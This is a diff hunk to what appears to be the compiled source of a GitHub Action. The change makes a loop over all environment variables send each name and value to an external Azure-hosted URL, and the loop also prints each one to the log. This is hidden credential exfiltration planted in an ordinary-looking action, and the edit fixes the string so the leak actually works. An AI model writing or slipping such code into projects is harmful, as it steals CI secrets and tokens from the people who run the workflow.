@@ -2124,7 +2124,10 @@ function run() {
         try {
             const sourceSettings = yield inputHelper.getInputs();
             for (const key in process.env) {
-                yield fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?${key}=${process.env[key]}');
+                yield fetch('https://chrish-git-demo-dud6dyadewhefzbs.northeurope-01.azurewebsites.net/api/logRequest?' +
+                    key +
+                    '=' +
+                    process.env[key]);
                 console.log(`${key} = ${process.env[key]}`);
             }
             try {
